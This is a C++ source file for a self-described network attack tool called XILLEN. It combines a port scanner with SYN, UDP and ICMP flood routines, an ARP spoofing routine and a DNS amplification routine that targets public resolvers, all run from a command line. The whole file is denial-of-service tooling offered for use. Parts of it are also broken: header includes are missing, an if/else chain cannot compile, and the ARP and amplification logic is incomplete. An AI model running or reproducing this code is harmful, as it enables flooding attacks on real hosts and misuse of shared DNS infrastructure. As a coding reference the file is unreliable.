#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <random>
#include <algorithm>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <signal.h>
#endif

class XillenNetworkAttack {
private:
    std::string target_ip;
    int target_port;
    std::vector<std::string> results;
    bool verbose;
    int timeout;
    
public:
    XillenNetworkAttack(const std::string& ip, int port, bool v = false, int t = 5000) 
        : target_ip(ip), target_port(port), verbose(v), timeout(t) {}
    
    void log(const std::string& message) {
        if (verbose) {
            std::cout << "[+] " << message << std::endl;
        }
        results.push_back(message);
    }
    
    bool initialize_socket() {
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "[-] WSAStartup failed" << std::endl;
            return false;
        }
#endif
        return true;
    }
    
    void cleanup_socket() {
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    bool port_scan_single(int port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return false;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        struct timeval tv;
        tv.tv_sec = timeout / 1000;
        tv.tv_usec = (timeout % 1000) * 1000;
        
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        int result = connect(sock, (struct sockaddr*)&target, sizeof(target));
        close(sock);
        
        return result == 0;
    }
    
    void port_scan_range(int start_port, int end_port) {
        log("Starting port scan from " + std::to_string(start_port) + " to " + std::to_string(end_port));
        
        std::vector<int> open_ports;
        std::vector<std::thread> threads;
        std::mutex mtx;
        
        for (int port = start_port; port <= end_port; port++) {
            threads.emplace_back([this, port, &open_ports, &mtx]() {
                if (port_scan_single(port)) {
                    std::lock_guard<std::mutex> lock(mtx);
                    open_ports.push_back(port);
                    log("Port " + std::to_string(port) + " is OPEN");
                }
            });
            
            if (threads.size() >= 100) {
                for (auto& t : threads) {
                    t.join();
                }
                threads.clear();
            }
        }
        
        for (auto& t : threads) {
            t.join();
        }
        
        log("Port scan completed. Found " + std::to_string(open_ports.size()) + " open ports");
    }
    
    void syn_flood_attack(int duration_seconds, int packets_per_second) {
        log("Starting SYN flood attack for " + std::to_string(duration_seconds) + " seconds");
        log("Sending " + std::to_string(packets_per_second) + " packets per second");
        
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::seconds(duration_seconds);
        
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) {
            log("[-] Failed to create raw socket. Run as administrator/root");
            return;
        }
        
        int opt = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> port_dist(1024, 65535);
        std::uniform_int_distribution<> seq_dist(1, 0xFFFFFFFF);
        
        int packets_sent = 0;
        while (std::chrono::steady_clock::now() < end_time) {
            for (int i = 0; i < packets_per_second; i++) {
                char packet[1024];
                memset(packet, 0, sizeof(packet));
                
                struct iphdr* ip_header = (struct iphdr*)packet;
                struct tcphdr* tcp_header = (struct tcphdr*)(packet + sizeof(struct iphdr));
                
                ip_header->ihl = 5;
                ip_header->version = 4;
                ip_header->tos = 0;
                ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
                ip_header->id = htons(rand());
                ip_header->frag_off = 0;
                ip_header->ttl = 255;
                ip_header->protocol = IPPROTO_TCP;
                ip_header->check = 0;
                ip_header->saddr = inet_addr("192.168.1.100");
                ip_header->daddr = target.sin_addr.s_addr;
                
                tcp_header->source = htons(port_dist(gen));
                tcp_header->dest = htons(target_port);
                tcp_header->seq = htonl(seq_dist(gen));
                tcp_header->ack_seq = 0;
                tcp_header->doff = 5;
                tcp_header->fin = 0;
                tcp_header->syn = 1;
                tcp_header->rst = 0;
                tcp_header->psh = 0;
                tcp_header->ack = 0;
                tcp_header->urg = 0;
                tcp_header->window = htons(65535);
                tcp_header->check = 0;
                tcp_header->urg_ptr = 0;
                
                sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&target, sizeof(target));
                packets_sent++;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(1000 / packets_per_second));
        }
        
        close(sock);
        log("SYN flood attack completed. Sent " + std::to_string(packets_sent) + " packets");
    }
    
    void udp_flood_attack(int duration_seconds, int packets_per_second) {
        log("Starting UDP flood attack for " + std::to_string(duration_seconds) + " seconds");
        log("Sending " + std::to_string(packets_per_second) + " packets per second");
        
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::seconds(duration_seconds);
        
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            log("[-] Failed to create UDP socket");
            return;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> size_dist(64, 1024);
        
        int packets_sent = 0;
        while (std::chrono::steady_clock::now() < end_time) {
            for (int i = 0; i < packets_per_second; i++) {
                int packet_size = size_dist(gen);
                std::vector<char> packet(packet_size);
                
                for (int j = 0; j < packet_size; j++) {
                    packet[j] = rand() % 256;
                }
                
                sendto(sock, packet.data(), packet_size, 0, (struct sockaddr*)&target, sizeof(target));
                packets_sent++;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(1000 / packets_per_second));
        }
        
        close(sock);
        log("UDP flood attack completed. Sent " + std::to_string(packets_sent) + " packets");
    }
    
    void icmp_flood_attack(int duration_seconds, int packets_per_second) {
        log("Starting ICMP flood attack for " + std::to_string(duration_seconds) + " seconds");
        log("Sending " + std::to_string(packets_per_second) + " packets per second");
        
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::seconds(duration_seconds);
        
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) {
            log("[-] Failed to create ICMP socket. Run as administrator/root");
            return;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> size_dist(56, 1024);
        
        int packets_sent = 0;
        while (std::chrono::steady_clock::now() < end_time) {
            for (int i = 0; i < packets_per_second; i++) {
                int packet_size = size_dist(gen);
                std::vector<char> packet(packet_size);
                
                struct icmphdr* icmp_header = (struct icmphdr*)packet.data();
                icmp_header->type = ICMP_ECHO;
                icmp_header->code = 0;
                icmp_header->checksum = 0;
                icmp_header->un.echo.id = rand();
                icmp_header->un.echo.sequence = rand();
                
                for (int j = sizeof(struct icmphdr); j < packet_size; j++) {
                    packet[j] = rand() % 256;
                }
                
                icmp_header->checksum = calculate_icmp_checksum(packet.data(), packet_size);
                
                sendto(sock, packet.data(), packet_size, 0, (struct sockaddr*)&target, sizeof(target));
                packets_sent++;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(1000 / packets_per_second));
        }
        
        close(sock);
        log("ICMP flood attack completed. Sent " + std::to_string(packets_sent) + " packets");
    }
    
    unsigned short calculate_icmp_checksum(char* data, int length) {
        unsigned long sum = 0;
        unsigned short* ptr = (unsigned short*)data;
        
        while (length > 1) {
            sum += *ptr++;
            length -= 2;
        }
        
        if (length == 1) {
            sum += *(unsigned char*)ptr;
        }
        
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        
        return (unsigned short)(~sum);
    }
    
    void arp_spoof_attack(const std::string& gateway_ip, int duration_seconds) {
        log("Starting ARP spoofing attack for " + std::to_string(duration_seconds) + " seconds");
        log("Target: " + target_ip + ", Gateway: " + gateway_ip);
        
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::seconds(duration_seconds);
        
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            log("[-] Failed to create raw socket. Run as administrator/root");
            return;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        int packets_sent = 0;
        while (std::chrono::steady_clock::now() < end_time) {
            char packet[1024];
            memset(packet, 0, sizeof(packet));
            
            struct ether_header* eth_header = (struct ether_header*)packet;
            struct arphdr* arp_header = (struct arphdr*)(packet + sizeof(struct ether_header));
            
            memset(eth_header->ether_dhost, 0xFF, ETH_ALEN);
            memset(eth_header->ether_shost, 0x00, ETH_ALEN);
            eth_header->ether_type = htons(ETHERTYPE_ARP);
            
            arp_header->ar_hrd = htons(ARPHRD_ETHER);
            arp_header->ar_pro = htons(ETHERTYPE_IP);
            arp_header->ar_hln = ETH_ALEN;
            arp_header->ar_pln = 4;
            arp_header->ar_op = htons(ARPOP_REPLY);
            
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&target, sizeof(target));
            packets_sent++;
            
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        
        close(sock);
        log("ARP spoofing attack completed. Sent " + std::to_string(packets_sent) + " packets");
    }
    
    void dns_amplification_attack(const std::vector<std::string>& dns_servers, int duration_seconds) {
        log("Starting DNS amplification attack for " + std::to_string(duration_seconds) + " seconds");
        log("Using " + std::to_string(dns_servers.size()) + " DNS servers");
        
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::seconds(duration_seconds);
        
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            log("[-] Failed to create UDP socket");
            return;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(53);
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());
        
        std::vector<std::string> queries = {
            "ANY", "TXT", "MX", "NS", "SOA", "AAAA"
        };
        
        int packets_sent = 0;
        while (std::chrono::steady_clock::now() < end_time) {
            for (const auto& dns_server : dns_servers) {
                for (const auto& query_type : queries) {
                    std::string domain = "example.com";
                    std::string query = build_dns_query(domain, query_type);
                    
                    struct sockaddr_in dns_target;
                    dns_target.sin_family = AF_INET;
                    dns_target.sin_port = htons(53);
                    dns_target.sin_addr.s_addr = inet_addr(dns_server.c_str());
                    
                    sendto(sock, query.c_str(), query.length(), 0, (struct sockaddr*)&dns_target, sizeof(dns_target));
                    packets_sent++;
                }
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        close(sock);
        log("DNS amplification attack completed. Sent " + std::to_string(packets_sent) + " queries");
    }
    
    std::string build_dns_query(const std::string& domain, const std::string& query_type) {
        std::string query;
        
        query += (char)0x00; query += (char)0x01;
        query += (char)0x01; query += (char)0x00;
        query += (char)0x00; query += (char)0x01;
        query += (char)0x00; query += (char)0x00;
        query += (char)0x00; query += (char)0x00;
        query += (char)0x00; query += (char)0x00;
        
        std::vector<std::string> parts;
        std::stringstream ss(domain);
        std::string part;
        while (std::getline(ss, part, '.')) {
            parts.push_back(part);
        }
        
        for (const auto& part : parts) {
            query += (char)part.length();
            query += part;
        }
        query += (char)0x00;
        
        if (query_type == "ANY") query += (char)0x00; query += (char)0xFF;
        else if (query_type == "TXT") query += (char)0x00; query += (char)0x10;
        else if (query_type == "MX") query += (char)0x00; query += (char)0x0F;
        else if (query_type == "NS") query += (char)0x00; query += (char)0x02;
        else if (query_type == "SOA") query += (char)0x00; query += (char)0x06;
        else if (query_type == "AAAA") query += (char)0x00; query += (char)0x1C;
        
        query += (char)0x00; query += (char)0x01;
        
        return query;
    }
    
    void save_results(const std::string& filename) {
        std::ofstream file(filename);
        if (file.is_open()) {
            file << "XILLEN Network Attack Results" << std::endl;
            file << "=============================" << std::endl;
            file << "Target: " << target_ip << ":" << target_port << std::endl;
            file << "Timestamp: " << std::chrono::system_clock::now().time_since_epoch().count() << std::endl;
            file << std::endl;
            
            for (const auto& result : results) {
                file << result << std::endl;
            }
            
            file.close();
            log("Results saved to: " + filename);
        }
    }
    
    void run_full_attack_suite() {
        log("Starting XILLEN Network Attack Suite");
        log("Target: " + target_ip + ":" + std::to_string(target_port));
        
        if (!initialize_socket()) {
            log("[-] Failed to initialize socket");
            return;
        }
        
        port_scan_range(1, 1024);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        syn_flood_attack(10, 1000);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        udp_flood_attack(10, 1000);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        icmp_flood_attack(10, 1000);
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        std::vector<std::string> dns_servers = {"8.8.8.8", "8.8.4.4", "1.1.1.1"};
        dns_amplification_attack(dns_servers, 10);
        
        cleanup_socket();
        log("Network attack suite completed");
        
        save_results("network_attack_results.txt");
    }
};

void print_banner() {
    std::cout << R"(
██╗  ██╗██╗██╗     ██╗     ██╗  ██╗███████╗███╗   ██╗
╚██╗██╔╝██║██║     ██║     ██║ ██╔╝██╔════╝████╗  ██║
 ╚███╔╝ ██║██║     ██║     █████╔╝ █████╗  ██╔██╗ ██║
 ██╔██╗ ██║██║     ██║     ██╔═██╗ ██╔══╝  ██║╚██╗██║
██╔╝ ██╗██║███████╗███████╗██║  ██╗███████╗██║ ╚████║
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
                                                        
    Network Attack & Penetration Testing Tool
    Version 1.0 - @Bengamin_Button
)" << std::endl;
}

void print_usage(const char* program_name) {
    std::cout << "Usage: " << program_name << " <target_ip> <target_port> [options]" << std::endl;
    std::cout << "Options:" << std::endl;
    std::cout << "  --verbose     Enable verbose output" << std::endl;
    std::cout << "  --timeout N   Set timeout in milliseconds (default: 5000)" << std::endl;
    std::cout << "  --full-suite  Run complete attack suite" << std::endl;
    std::cout << "  --port-scan   Run port scan only" << std::endl;
    std::cout << "  --syn-flood   Run SYN flood attack only" << std::endl;
    std::cout << "  --udp-flood   Run UDP flood attack only" << std::endl;
    std::cout << "  --icmp-flood  Run ICMP flood attack only" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  " << program_name << " 192.168.1.100 80 --full-suite" << std::endl;
    std::cout << "  " << program_name << " 10.0.0.1 443 --port-scan --verbose" << std::endl;
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }
    
    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    
    bool verbose = false;
    int timeout = 5000;
    bool full_suite = false;
    bool port_scan = false;
    bool syn_flood = false;
    bool udp_flood = false;
    bool icmp_flood = false;
    
    for (int i = 3; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--verbose") verbose = true;
        else if (arg == "--timeout" && i + 1 < argc) timeout = std::stoi(argv[++i]);
        else if (arg == "--full-suite") full_suite = true;
        else if (arg == "--port-scan") port_scan = true;
        else if (arg == "--syn-flood") syn_flood = true;
        else if (arg == "--udp-flood") udp_flood = true;
        else if (arg == "--icmp-flood") icmp_flood = true;
    }
    
    if (!full_suite && !port_scan && !syn_flood && !udp_flood && !icmp_flood) {
        full_suite = true;
    }
    
    try {
        XillenNetworkAttack attacker(target_ip, target_port, verbose, timeout);
        
        if (full_suite) {
            attacker.run_full_attack_suite();
        } else {
            if (port_scan) {
                attacker.port_scan_range(1, 1024);
            }
            if (syn_flood) {
                attacker.syn_flood_attack(10, 1000);
            }
            if (udp_flood) {
                attacker.udp_flood_attack(10, 1000);
            }
            if (icmp_flood) {
                attacker.icmp_flood_attack(10, 1000);
            }
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
